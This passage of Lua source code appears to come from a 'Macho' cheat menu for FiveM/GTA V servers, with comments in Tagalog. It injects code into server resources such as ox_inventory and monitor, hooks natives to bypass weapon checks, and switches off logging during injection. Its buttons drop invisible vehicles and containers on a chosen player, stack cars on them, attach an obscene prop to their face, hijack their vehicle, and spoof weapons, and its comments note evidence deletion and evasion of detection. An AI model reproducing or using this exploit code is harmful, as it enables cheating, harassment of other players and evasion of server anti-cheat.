                                    -- DELETE AFTER 2 SECONDS (no evidence)
                                    Citizen.SetTimeout(2000, function()
                                        if DoesEntityExist(veh) then DeleteEntity(veh) end
                                    end)
                                end
                            end)
                        end
                    end
                    Wait(150)
                end
                
                -- SECOND WAVE - USING RANDOM VEHICLES (harder to detect pattern)
                local randomVehicles = {"asbo", "brioso", "issi2", "panto", "rhapsody", "cog55"}
                for i = 1, 15 do
                    local randomCar = randomVehicles[math.random(1, #randomVehicles)]
                    local randomHash = GetHashKey(randomCar)
                    RequestModel(randomHash)
                    while not HasModelLoaded(randomHash) do Wait(10) end
                    
                    if DoesEntityExist(tP) then
                        local pos = GetEntityCoords(tP)
                        local veh = CreateVehicle(randomHash, pos.x + math.random(-5, 5), pos.y + math.random(-5, 5), pos.z + math.random(60, 150), math.random(0, 360), true, false)
                        
                        if DoesEntityExist(veh) then
                            SetEntityVisible(veh, false, false)
                            SetEntityAlpha(veh, 0, false)
                            SetEntityAsMissionEntity(veh, true, true)
                            
                            ApplyForceToEntity(veh, 3, math.random(-30, 30), math.random(-30, 30), -350.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            
                            Citizen.SetTimeout(2500, function()
                                if DoesEntityExist(veh) then DeleteEntity(veh) end
                            end)
                        end
                    end
                    Wait(100)
                    SetModelAsNoLongerNeeded(randomHash)
                end
                
                SetModelAsNoLongerNeeded(mH)
            end
        end
    ]], tId, selectedCar))
end)





MachoMenuButton(Tab4Group1, "Toggle Vehicle Stack", function()
    local targetId = MachoMenuGetSelectedPlayer()
    if not targetId or targetId == 0 or targetId == "" then
        targetId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    
    if not targetId or targetId == 0 then return end

    IsStackingActive = not IsStackingActive

    if IsStackingActive then
        MachoInjectResource2(3, "any", string.format([[
            _G.activeStacks = _G.activeStacks or {}
            local tID = %d
            _G.activeStacks[tID] = true
            local vH = GetHashKey('jugular')
            
            Citizen.CreateThread(function()
                RequestModel(vH)
                local t = 0
                while not HasModelLoaded(vH) and t < 50 do Wait(1) t = t + 1 end
                
                while _G.activeStacks[tID] do
                    local tP = 0
                    for _, p in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(p) == tID or p == tID then tP = GetPlayerPed(p) break end
                    end
                    
                    if tP ~= 0 and DoesEntityExist(tP) and not IsPedDeadOrDying(tP) then
                        local coords = GetEntityCoords(tP)
                        local veh = CreateVehicle(vH, coords.x, coords.y, coords.z, GetEntityHeading(tP), true, false)
                        if DoesEntityExist(veh) then
                            SetVehicleNumberPlateText(veh, "MACHO")
                            SetVehicleOnGroundProperly(veh)
                            SetEntityAsNoLongerNeeded(veh)
                        end
                    else
                        _G.activeStacks[tID] = nil
                    end
                    Wait(800)
                end
            end)
        ]], targetId))
    else

        MachoInjectResource2(3, "any", "_G.activeStacks = {}")
    end
end)


MachoMenuButton(Tab4Group1, "Fall Marquis", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    if not tId or tId == 0 then return end
    
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, mH, tP = %d, GetHashKey("marquis"), 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(mH)
            local t = 0
            while not HasModelLoaded(mH) and t < 100 do Wait(1) t = t + 1 end
            
            if HasModelLoaded(mH) then
                for i = 1, 10 do 
                    if DoesEntityExist(tP) then
                        local pos = GetEntityCoords(tP)
                        local veh = CreateVehicle(mH, pos.x, pos.y, pos.z + 30.0, 0.0, true, true)
                        
                        if DoesEntityExist(veh) then
                            SetEntityAsMissionEntity(veh, true, true)
                            
                            ApplyForceToEntity(veh, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            
                            Citizen.SetTimeout(5000, function()
                                if DoesEntityExist(veh) then
                                    DeleteVehicle(veh)
                                end
                            end)
                        end
                    end
                    Wait(200) 
                end
                SetModelAsNoLongerNeeded(mH)
            end
        end
    ]], tId))
end)

MachoMenuButton(Tab4Group1, "Fall Container", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    if not tId or tId == 0 then return end
    
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, tP = %d, 0
        local props = {
            GetHashKey("prop_container_04a"),
            GetHashKey("prop_towercrane_02a"),
            GetHashKey("prop_container_01a")
        }

        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        
        if tP ~= 0 and DoesEntityExist(tP) then
            for _, model in ipairs(props) do
                RequestModel(model)
                local t = 0
                while not HasModelLoaded(model) and t < 30 do Wait(1) t = t + 1 end
            end

            for i = 1, 15 do
                if DoesEntityExist(tP) then
                    local pos = GetEntityCoords(tP)
                    local selectedModel = props[math.random(1, #props)]
                    
                    if HasModelLoaded(selectedModel) then
                        local obj = CreateObject(selectedModel, pos.x, pos.y, pos.z + 30.0, true, true, false)
                        
                        if DoesEntityExist(obj) then
                            SetEntityAsNoLongerNeeded(obj)
                            ActivatePhysics(obj)
                            ApplyForceToEntity(obj, 3, 0.0, 0.0, -1000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        end
                    end
                end
                Wait(100) 
            end

            for _, model in ipairs(props) do
                SetModelAsNoLongerNeeded(model)
            end
        end
    ]], tId))
end)



MachoMenuButton(Tab4Group1, "Face Gift", function()
    local inputId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local tId = (inputId and inputId > 0) and inputId or selPlayer

    if not tId or tId == 0 then 
        MachoMenuNotification("Face Gift", "Walang Target!")
        return 
    end
    
    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        local mH = GetHashKey("prop_cs_dildo_01")

        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT then tP = GetPlayerPed(p) break end
        end
        
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(mH)
            while not HasModelLoaded(mH) do Wait(1) end
            
            local coords = GetEntityCoords(tP)
            -- Ang true, true, true sa dulo ay para sa isNetwork, netMissionEntity, at doorFlag
            local obj = CreateObject(mH, coords.x, coords.y, coords.z, true, true, true)
            
            if DoesEntityExist(obj) then
                -- 1. Kunin ang Network Control
                NetworkRequestControlOfEntity(obj)
                local timeout = 0
                while not NetworkHasControlOfEntity(obj) and timeout < 50 do Wait(1) timeout = timeout + 1 end

                -- 2. Gawing Mission Entity (Anti-Cleanup)
                SetEntityAsMissionEntity(obj, true, true)
                
                -- 3. I-attach
                local boneIndex = GetPedBoneIndex(tP, 31086) 
                AttachEntityToEntity(obj, tP, boneIndex, 0.15, 0.13, 0.0, 0.0, 90.0, 0.0, true, true, false, true, 1, true)
                
                -- 4. Karagdagang persistence flags
                SetModelAsNoLongerNeeded(mH)
                
                -- Opsyonal: I-loop ang attachment para kung sakaling ma-glitch, babalik siya
                -- Pero karaniwan sapat na ang Mission Entity flag.
            end
        end
    ]], tId))
end)




MachoMenuText(Tab4Group1, "Steal Car (Safe)")




MachoMenuButton(Tab4Group1, "TP & Hijack Driver Seat", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local tId = tonumber(MachoMenuGetInputbox(GlobalTargetID)) or 0
    
    if selectedVeh == 0 and tId == 0 then 
        return 
    end

   MachoInjectResource2(3, "any", string.format([[
    local selVeh = %d
    local tID = %d
    local myPed = PlayerPedId()
    local targetVeh = 0

    -- Hanapin ang sasakyan base sa ID o Target Player
    if selVeh ~= 0 and DoesEntityExist(selVeh) then
        targetVeh = selVeh
    elseif tID ~= 0 then
        local targetPlayer = GetPlayerFromServerId(tID)
        if targetPlayer ~= -1 then
            targetVeh = GetVehiclePedIsIn(GetPlayerPed(targetPlayer), true)
        end
    end

    if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
        Citizen.CreateThread(function()
            -- 1. Request Control (Kritikal para sa Networked Vehicles)
            local timeout = 0
            while not NetworkHasControlOfEntity(targetVeh) and timeout < 30 do
                NetworkRequestControlOfEntity(targetVeh)
                Citizen.Wait(100)
                timeout = timeout + 1
            end

            -- 2. Kick the Current Driver (kung meron man)
            local currentDriver = GetPedInVehicleSeat(targetVeh, -1)
            if currentDriver ~= 0 and currentDriver ~= myPed then
                ClearPedTasksImmediately(currentDriver)
                -- Opsyonal: I-teleport sila sa labas para sigurado
                SetEntityCoords(currentDriver, GetEntityCoords(currentDriver) + vector3(0, 0, 2.0))
            end

            -- 3. TP to Driver Seat & Set Controls
            SetPedIntoVehicle(myPed, targetVeh, -1)
            SetVehicleExclusiveDriver(targetVeh, myPed)
            
            -- Prevent engine from turning off or getting kicked out
            SetVehicleEngineOn(targetVeh, true, true, false)
            SetPedConfigFlag(myPed, 32, false) -- Is_Ped_In_Vehicle flag

            -- 4. Set Invisibility
            -- Gamit ang SetEntityVisible(entity, visible, false)
            SetEntityVisible(myPed, false, false)
            
            -- Opsyonal: Sabihan ang user (Client-side notification)
            -- print("Hijack Successful: Invisibility ON")

            -- I-reset ang invisibility pagbaba (Opsyonal na logic)
            Citizen.CreateThread(function()
                while IsPedInVehicle(myPed, targetVeh, true) do
                    Citizen.Wait(500)
                end
                SetEntityVisible(myPed, true, false)
            end)
        end)
    end
]], selectedVeh, tId))
end)


MachoMenuButton(Tab4Group2, "Tp to Driver Seat", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local tId = tonumber(MachoMenuGetInputbox(GlobalTargetID)) or 0
    if selectedVeh == 0 and tId == 0 then 
        MachoMenuNotification("Error", "Pili ka sa listahan o mag-type ng Server ID!")
        return 
    end

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local tID = %d
        local myPed = PlayerPedId()
        local targetVeh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            targetVeh = selVeh
        elseif tID ~= 0 then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == tID then
                    targetVeh = GetVehiclePedIsIn(GetPlayerPed(player), true)
                    break
                end
            end
        end

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            NetworkRequestControlOfEntity(targetVeh)
            TaskWarpPedIntoVehicle(myPed, targetVeh, -1)
        else
            _G.MachoMenuNotification("Error", "Hindi mahanap ang sasakyan!")
        end
    ]], selectedVeh, tId))
end)

MachoMenuButton(Tab4Group2, "Tp to Passenger Seat", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local tId = tonumber(MachoMenuGetInputbox(GlobalTargetID)) or 0
    
    if selectedVeh == 0 and tId == 0 then 
        MachoMenuNotification("Error", "Pili ka sa listahan o mag-type ng Server ID!")
        return 
    end

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local tID = %d
        local myPed = PlayerPedId()
        local targetVeh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            targetVeh = selVeh
        elseif tID ~= 0 then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == tID then
                    targetVeh = GetVehiclePedIsIn(GetPlayerPed(player), true)
                    break
                end
            end
        end

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            -- Seat Index 0 is the front passenger
            SetPedIntoVehicle(myPed, targetVeh, 0)
        else
            TriggerEvent('chat:addMessage', { args = { '^1[ERROR]', 'Hindi mahanap ang sasakyan!' } })
        end
    ]], selectedVeh, tId))
end)

MachoMenuButton(Tab4Group2, "Tp to Back Left", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local tId = tonumber(MachoMenuGetInputbox(GlobalTargetID)) or 0
    
    if selectedVeh == 0 and tId == 0 then 
        MachoMenuNotification("Error", "Pili ka sa listahan o mag-type ng Server ID!")
        return 
    end

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local tID = %d
        local myPed = PlayerPedId()
        local targetVeh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            targetVeh = selVeh
        elseif tID ~= 0 then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == tID then
                    targetVeh = GetVehiclePedIsIn(GetPlayerPed(player), true)
                    break
                end
            end
        end

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            -- Seat Index 1 is Rear Left
            SetPedIntoVehicle(myPed, targetVeh, 1)
        else
            TriggerEvent('chat:addMessage', { args = { '^1[ERROR]', 'Hindi mahanap ang sasakyan!' } })
        end
    ]], selectedVeh, tId))
end)

MachoMenuButton(Tab4Group2, "Tp to Back Right", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local tId = tonumber(MachoMenuGetInputbox(GlobalTargetID)) or 0
    
    if selectedVeh == 0 and tId == 0 then 
        MachoMenuNotification("Error", "Pili ka sa listahan o mag-type ng Server ID!")
        return 
    end

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local tID = %d
        local myPed = PlayerPedId()
        local targetVeh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            targetVeh = selVeh
        elseif tID ~= 0 then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == tID then
                    targetVeh = GetVehiclePedIsIn(GetPlayerPed(player), true)
                    break
                end
            end
        end

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            -- Seat Index 2 is Rear Right
            SetPedIntoVehicle(myPed, targetVeh, 2)
        else
            TriggerEvent('chat:addMessage', { args = { '^1[ERROR]', 'Hindi mahanap ang sasakyan!' } })
        end
    ]], selectedVeh, tId))
end)


local buhatToggled = false 

MachoMenuButton(Tab4Group2, "Buhat", function()
    buhatToggled = not buhatToggled 
    
    if buhatToggled then
    else
        buhatToggled = false
    end
end)

local holdingEntity = false
local holdingCarEntity = false
local holdingPed = false
local heldEntity = nil
local entityType = nil

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if buhatToggled and holdingEntity and heldEntity then
            local playerPed = PlayerPedId()
            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "Esse Is Here!")
            
            if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                RequestAnimDict('anim@mp_rollarcoaster')
                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do Citizen.Wait(100) end
                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
            elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                RequestAnimDict('anim@heists@box_carry@')
                while not HasAnimDictLoaded('anim@heists@box_carry@') do Citizen.Wait(100) end
                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
            end
            
            if not IsEntityAttached(heldEntity) then
                holdingEntity, holdingCarEntity, holdingPed, heldEntity = false, false, false, nil
            end
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if buhatToggled then
            local playerPed = PlayerPedId()
            local camPos = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            local direction = RotationToDirection(camRot)
            local distance = 100.0
            local dest = vec3(camPos.x + direction.x * distance, camPos.y + direction.y * distance, camPos.z + direction.z * distance)
            local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
            local retval, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
            local validTarget = false

            if entityHit ~= 0 and retval == 2 then
                entityType = GetEntityType(entityHit)
                if entityType == 3 or entityType == 2 or entityType == 1 then
                    validTarget = true
                    local entityText = entityType == 3 and "Object" or (entityType == 2 and "Car" or "Ped")
                    local entityModel = GetEntityModel(entityHit)
                    local accessInfo = (entityType == 2) and (NetworkHasControlOfEntity(entityHit) and ", Access: Yes" or ", Access: No") or ""
                    
                    if entityType == 2 and not NetworkHasControlOfEntity(entityHit) then
                        NetworkRequestControlOfEntity(entityHit)
                    end
                    
                    local entityInfo = "Entity Type: " .. entityText .. ", Entity: " .. entityHit .. ", Model: " .. entityModel .. accessInfo
                    local headPos = GetEntityCoords(entityHit, true)
                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, entityInfo)
                end
            end

            if IsControlJustReleased(0, 246) then 
                if validTarget then
                    if not holdingEntity and entityHit then
                        if entityType == 3 then
                            local entityModel = GetEntityModel(entityHit)
                            RequestModel(entityModel)
                            while not HasModelLoaded(entityModel) do Citizen.Wait(100) end
                            local clonedEntity = CreateObject(entityModel, camPos.x, camPos.y, camPos.z, true, true, true)
                            SetModelAsNoLongerNeeded(entityModel)
                            holdingEntity, heldEntity = true, clonedEntity
                            RequestAnimDict("anim@heists@box_carry@")
                            while not HasAnimDictLoaded("anim@heists@box_carry@") do Citizen.Wait(100) end
                            TaskPlayAnim(playerPed, "anim@heists@box_carry@", "idle", 8.0, -8.0, -1, 50, 0, false, false, false)
                            AttachEntityToEntity(clonedEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                        elseif entityType == 2 then
                            holdingEntity, holdingCarEntity, heldEntity = true, true, entityHit
                            RequestAnimDict('anim@mp_rollarcoaster')
                            while not HasAnimDictLoaded('anim@mp_rollarcoaster') do Citizen.Wait(100) end
                            TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                            AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        elseif entityType == 1 then
                            holdingEntity, holdingPed, heldEntity = true, true, entityHit
                            RequestAnimDict('anim@heists@box_carry@')
                            while not HasAnimDictLoaded('anim@heists@box_carry@') do Citizen.Wait(100) end
                            TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                            local playerCoords = GetEntityCoords(playerPed)
                            SetEntityCoords(heldEntity, playerCoords.x, playerCoords.y, playerCoords.z - 1.0, false, false, false, false)
                            ClearPedTasksImmediately(heldEntity)
                            AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        end
                    end
                else
                    if holdingEntity then
                        ClearPedTasks(playerPed)
                        DetachEntity(heldEntity, true, true)
                        if not holdingCarEntity and not holdingPed then
                            local playerCoords = GetEntityCoords(playerPed)
                            SetEntityCoords(heldEntity, playerCoords.x, playerCoords.y, playerCoords.z - 1.0, false, false, false, false)
                            SetEntityHeading(heldEntity, GetEntityHeading(playerPed))
                        end
                        ApplyForceToEntity(heldEntity, 1, direction.x * 200, direction.y * 200, direction.z * 200, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        holdingEntity, holdingCarEntity, holdingPed, heldEntity = false, false, false, nil
                    end
                end
            end

            if IsControlJustReleased(0, 303) and holdingPed and validTarget then
                DetachEntity(heldEntity, true, true) 
                AttachEntityToEntity(heldEntity, entityHit, 0, 0.0, 0.0, 1.5, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                FreezeEntityPosition(heldEntity, true) 
                TaskStartScenarioInPlace(heldEntity, "WORLD_HUMAN_PARTYING", 0, true) 
                holdingPed, heldEntity = false, nil
            end
        end
    end
end)

function RotationToDirection(rotation)
    local adj = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
    return vec3(-math.sin(adj.z) * math.abs(math.cos(adj.x)), math.cos(adj.z) * math.abs(math.cos(adj.x)), math.sin(adj.x))
end

function DrawText3Ds(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        local px, py, pz = table.unpack(GetGameplayCamCoords())
        local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2 * (1 / GetGameplayCamFov()) * 100
        SetTextScale(0.0, 0.35 * scale)
        SetTextFont(0)
        SetTextColour(255, 255, 255, 215)
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end



Tab5Button = MachoMenuAddTab(TabbedWindow, "Weapon Exploits")
Tab5Group1 = MachoMenuGroup(Tab5Button, "Exploits", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, 690-TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)
   

_G.UltimateBypassActive = false


MachoHookNative(0x475768F1331F738F, function(ped, type)
    if _G.UltimateBypassActive and ped == PlayerPedId() then
        return false, true 
    end
    return true
end)

MachoHookNative(0x519445FD667616A5, function(ped, weaponHash)
    if _G.UltimateBypassActive and ped == PlayerPedId() then
        return false, true
    end
    return true
end)

MachoMenuCheckbox(Tab5Group1, "Ultimate Bypass (Weapon Spoof)", 
    function() 
        _G.UltimateBypassActive = true
        
        MachoInjectResource2(3, "monitor", [[
            LocalPlayer.state:set('invBusy', false, true)
            LocalPlayer.state:set('canUseWeapons', true, true)
        ]])
        
        MachoMenuNotification("Macho", "Bypass: ~g~Active")
    end,
    
    function() 
        _G.UltimateBypassActive = false
        MachoMenuNotification("Macho", "Bypass: ~r~Disabled")
    end
)

MachoMenuCheckbox(Tab5Group1, "Auto Attachment", 
    function() 
        _G.AutoUpgradeActive = true
        
        Citizen.CreateThread(function()
            while _G.AutoUpgradeActive do
                local ped = PlayerPedId()
                local weaponHash = GetSelectedPedWeapon(ped)

                if weaponHash ~= GetHashKey("WEAPON_UNARMED") then
                    local components = {
                        -- Suppressors / Silencers
                        "COMPONENT_AT_AR_SUPP", "COMPONENT_AT_PI_SUPP", "COMPONENT_AT_PI_SUPP_02", "COMPONENT_AT_AR_SUPP_02", "COMPONENT_AT_SR_SUPP", "COMPONENT_AT_SR_SUPP_02",
                        -- Flashlights
                        "COMPONENT_AT_AR_FLSH", "COMPONENT_AT_PI_FLSH", "COMPONENT_AT_PI_FLSH_02",
                        -- Grips
                        "COMPONENT_AT_AR_AFGRIP", "COMPONENT_AT_AR_AFGRIP_02",
                        -- Scopes
                        "COMPONENT_AT_SCOPE_MACRO", "COMPONENT_AT_SCOPE_MACRO_02", "COMPONENT_AT_SCOPE_SMALL", "COMPONENT_AT_SCOPE_SMALL_02",
                        "COMPONENT_AT_SCOPE_MEDIUM", "COMPONENT_AT_SCOPE_LARGE", "COMPONENT_AT_SCOPE_MAX", "COMPONENT_AT_SCOPE_NV", "COMPONENT_AT_SCOPE_THERMAL",
                        -- Muzzles
                        "COMPONENT_AT_MUZZLE_01", "COMPONENT_AT_MUZZLE_02", "COMPONENT_AT_MUZZLE_03", "COMPONENT_AT_MUZZLE_04", "COMPONENT_AT_MUZZLE_05", "COMPONENT_AT_MUZZLE_06", "COMPONENT_AT_MUZZLE_07",
                        -- Extended Magazines
                        "COMPONENT_PISTOL_CLIP_02", "COMPONENT_COMBATPISTOL_CLIP_02", "COMPONENT_APPISTOL_CLIP_02", "COMPONENT_MICROSMG_CLIP_02", "COMPONENT_SMG_CLIP_02",
                        "COMPONENT_ASSAULTRIFLE_CLIP_02", "COMPONENT_CARBINERIFLE_CLIP_02", "COMPONENT_SPECIALCARBINE_CLIP_02", "COMPONENT_HEAVYSNIPER_CLIP_02",
                        "COMPONENT_PISTOL_MK2_CLIP_02", "COMPONENT_SMG_MK2_CLIP_02", "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02", "COMPONENT_CARBINERIFLE_MK2_CLIP_02"
                    }

                    for _, component in ipairs(components) do
                        local compHash = GetHashKey(component)
                        if DoesWeaponTakeWeaponComponent(weaponHash, compHash) then
                            if not HasPedGotWeaponComponent(ped, weaponHash, compHash) then
                                GiveWeaponComponentToPed(ped, weaponHash, compHash)
                            end
                        end
                    end
                end
                
                Citizen.Wait(1000) 
            end
        end)

        MachoMenuNotification("Macho", "Auto Attachment: ~g~ON")
    end,
    
    function() 
        _G.AutoUpgradeActive = false
        MachoMenuNotification("Macho", "Auto Attachment: ~r~OFF")
    end
)
MachoMenuCheckbox(Tab5Group1, "Weapon Rainbow Skin", 
    function() 
        _G.RainbowSkinActive = true
        
        Citizen.CreateThread(function()
            local currentTint = 0
            -- Karamihan ng baril ay may 0 hanggang 7 tints
            local maxTints = 7 

            while _G.RainbowSkinActive do
                local ped = PlayerPedId()
                local weaponHash = GetSelectedPedWeapon(ped)

                -- Check kung hindi "Unarmed" ang hawak
                if weaponHash ~= GetHashKey("WEAPON_UNARMED") then
                    
                    -- I-set yung tint
                    SetPedWeaponTintIndex(ped, weaponHash, currentTint)
                    
                    -- Usad sa susunod na kulay
                    currentTint = currentTint + 1
                    
                    -- Kung lumagpas na sa max, balik sa simula (0)
                    if currentTint > maxTints then
                        currentTint = 0
                    end
                end
                
                -- Bilis ng pagpapalit ng kulay (500ms = 0.5 seconds)
                Citizen.Wait(500) 
            end
        end)

        MachoMenuNotification("Macho", "Rainbow Skin: Enabled")
    end,
    
    function() 
        _G.RainbowSkinActive = false
        
        -- Opsyonal: I-reset sa default tint (0) kapag in-off
        local ped = PlayerPedId()
        local weaponHash = GetSelectedPedWeapon(ped)
        if weaponHash ~= GetHashKey("WEAPON_UNARMED") then
             SetPedWeaponTintIndex(ped, weaponHash, 0)
        end

        MachoMenuNotification("Macho", "Rainbow Skin: Disabled")
    end
)


MachoMenuText(Tab5Group1, "Gun Spoof (Safe)")

local PAKAKSpoofInput = MachoMenuInputbox(Tab5Group1, "Weapon Name", "weapon_pistol")

MachoMenuButton(Tab5Group1, "Spoof Weapon", function()
    local rawInput = MachoMenuGetInputbox(PAKAKSpoofInput)
    if not rawInput or rawInput == "" then return end

    local weaponName = string.upper(rawInput)
    if not weaponName:find("WEAPON_") then weaponName = "WEAPON_" .. weaponName end

    MachoSetLoggerState(0)

    MachoInjectResource2(3, "ox_inventory", [[
        local name = "]] .. weaponName .. [["
        local hash = GetHashKey(name)
        
        pcall(function()
            local Weapon = require 'modules.weapon.client'
            if Weapon then
                Weapon.Disarm = function() return currentWeapon end
                Weapon.ClearAll = function() end
            end
        end)

        currentWeapon = {
            name = name,
            hash = hash,
            metadata = { durability = 100, registered = true },
            ammo = 500
        }

        local ped = PlayerPedId()
        GiveWeaponToPed(ped, hash, 500, false, true)
        SetCurrentPedWeapon(ped, hash, true)
        
        LocalPlayer.state:set('canUseWeapons', true, true)
        LocalPlayer.state:set('invBusy', false, true)
    ]])

    MachoSetLoggerState(1)
    MachoMenuNotification("Spoof", weaponName .. "")
end)



MachoMenuButton(Tab5Group1, "Remove Spoofed Weapon", function()
    MachoInjectResource2(0, "ox_inventory", [[
        local ped = PlayerPedId()
        local weapon = GetSelectedPedWeapon(ped)
        
        if weapon ~= GetHashKey("WEAPON_UNARMED") then
            RemoveWeaponFromPed(ped, weapon)
            SetCurrentPedWeapon(ped, GetHashKey("WEAPON_UNARMED"), true)
            
            currentWeapon = nil
        end
    ]])
end)

_G.MachoFastReloadActive = false

Citizen.CreateThread(function()
    while true do
        if _G.MachoFastReloadActive then
            local ped = PlayerPedId()
            
            if GetIsPedReloading(ped) then

                SetEntityAnimPlaybackRate(ped, 2.5) 
            end
            Citizen.Wait(50) 
        else
            Citizen.Wait(1000) 
        end
    end
end)





MachoMenuText(Tab5Group1, "Spawn Hand Weapon")

local PAKAKSpoofInput = MachoMenuInputbox(Tab5Group1, "Weapon Name", "weapon_pistol")

MachoMenuButton(Tab5Group1, "Spawn Weapon", function()
    local rawInput = MachoMenuGetInputbox(PAKAKSpoofInput)
    if not rawInput or rawInput == "" then return end

    local weaponName = string.upper(rawInput)
    if not weaponName:find("WEAPON_") then weaponName = "WEAPON_" .. weaponName end

    MachoSetLoggerState(0)

    MachoInjectResource2(3, "any", [[
        local name = "]] .. weaponName .. [["
        local hash = GetHashKey(name)
        
        pcall(function()
            local Weapon = require 'modules.weapon.client'
            if Weapon then
                Weapon.Disarm = function() return currentWeapon end
                Weapon.ClearAll = function() end
            end
        end)

        currentWeapon = {
            name = name,
            hash = hash,
            metadata = { durability = 100, registered = true },
            ammo = 500
        }

        local ped = PlayerPedId()
        GiveWeaponToPed(ped, hash, 500, false, true)
        SetCurrentPedWeapon(ped, hash, true)
        
        LocalPlayer.state:set('canUseWeapons', true, true)
        LocalPlayer.state:set('invBusy', false, true)
    ]])

    MachoSetLoggerState(1)
    MachoMenuNotification("Spoof", weaponName .. "")
end)



MachoMenuButton(Tab5Group1, "Remove Weapon", function()
    MachoInjectResource2(0, "monitor", [[
        local ped = PlayerPedId()
        local weapon = GetSelectedPedWeapon(ped)
        
        if weapon ~= GetHashKey("WEAPON_UNARMED") then
            RemoveWeaponFromPed(ped, weapon)
            SetCurrentPedWeapon(ped, GetHashKey("WEAPON_UNARMED"), true)
            
            currentWeapon = nil
        end
    ]])
end)

_G.MachoFastReloadActive = false

Citizen.CreateThread(function()
    while true do
        if _G.MachoFastReloadActive then
            local ped = PlayerPedId()
            
            if GetIsPedReloading(ped) then

                SetEntityAnimPlaybackRate(ped, 2.5) 
            end
            Citizen.Wait(50) 
        else
            Citizen.Wait(1000) 
        end
    end
end)















MachoMenuCheckbox(Tab5Group1, "One Tap", function()
    MachoMenuNotification("1 Tap", "ENABLED | Shoot")
    
